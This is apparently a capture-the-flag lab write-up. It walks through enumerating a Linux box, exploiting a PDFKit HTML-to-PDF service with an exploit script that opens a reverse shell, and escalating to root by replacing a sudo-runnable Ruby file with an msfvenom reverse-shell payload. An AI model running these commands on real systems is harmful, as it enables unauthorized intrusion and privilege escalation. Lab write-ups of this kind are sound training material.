---
Status: Done
OS: Linux
Difficulty: Easy
tags:
  - ruby
  - pdfkit
Date: 2026-07-22T22:50:00
Owned: 2026-07-22T23:48:00
---

---
# Enumeration
## port scan
rustscan all ports  
![[Pasted image 20260722225833.png]]

nmap all ports with script  
![[Pasted image 20260722225942.png]]

## SSH

anonymous tested  
![[Pasted image 20260722230001.png]]

## port 3000
web page  
![[Pasted image 20260722230030.png]]

hmm html to PDF  
![[Pasted image 20260722230150.png]]

tried to get file from our attacking host  
![[Pasted image 20260722230140.png]]

it shows the file in pdf format  

# Exploit
try uploading test.pdf  
![[Pasted image 20260722231149.png]]

got error but we know it use PDFKit  
![[Pasted image 20260722231207.png]]

might worth a try  
![[Pasted image 20260722231348.png]]
```
python3 51293.py -s 192.168.45.183 22 -w http://192.168.111.22:3000/pdf -p url
```

from burp request the parameter is url  
![[Pasted image 20260722231337.png]]

run the exploit  
![[Pasted image 20260722231526.png]]

got the shell as andrew  
![[Pasted image 20260722231548.png]]

got the local flag  
![[Pasted image 20260722231954.png]]

# Priv Esc
running `sudo -l`
![[Pasted image 20260722232101.png]]

andrew can run ruby  
look for ruby in GTFObins  
![[Pasted image 20260722232141.png]]

it still ask for password  

yes since andrew has permission on /home/andrew/app/app.rb

let's generate revshell.rb  
```sh
msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.45.183 LPORT=22 -o revshell.rb
```
 ![[Pasted image 20260722233911.png]]
 save the file revshell.rb as app.rb  
 ![[Pasted image 20260722234512.png]]
 
 now run the app.rb  
 ![[Pasted image 20260722234527.png]]
 
 we got shell on our listener as root  
 ![[Pasted image 20260722234545.png]]
 
 get the flag  
![[Pasted image 20260722234732.png]]

 
 